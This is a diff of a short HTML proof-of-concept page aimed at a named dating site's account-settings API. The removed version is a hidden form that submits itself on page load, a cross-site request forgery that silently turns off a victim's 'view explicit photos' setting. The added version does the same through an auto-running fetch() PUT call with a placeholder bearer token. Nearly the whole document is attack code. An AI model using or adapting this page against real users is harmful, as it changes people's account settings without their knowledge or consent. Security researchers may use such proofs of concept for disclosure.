@@ -1,9 +1,23 @@
-<form action="https://api.ashleymadison.com/v2/account/profileoptions/" method="PUT">
-  <input type="hidden" name="view_rated" value="false">
-  <input type="hidden" name="location" value="settings">
-  <input type="hidden" name="field_type[view_rated]" value="toggle button">
-  <input type="hidden" name="tooltip[view_rated]" value="View Explicit Photos">
-</form>
-<script>
-  document.forms[0].submit();
-</script>
+<html>
+<body>
+    <script>
+        fetch('https://api.ashleymadison.com/v2/account/profileoptions/', {
+            method: 'PUT',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer YOUR_ACCESS_TOKEN_HERE'
+            },
+            body: JSON.stringify({
+                "view_rated": false,
+                "location": "settings",
+                "field_type": { "view_rated": "toggle button" },
+                "tooltip": { "view_rated": "View Explicit Photos" }
+            })
+        }).then(response => {
+            console.log('Request completed with status:', response.status);
+        }).catch(error => {
+            console.error('Error:', error);
+        });
+    </script>
+</body>
+</html>
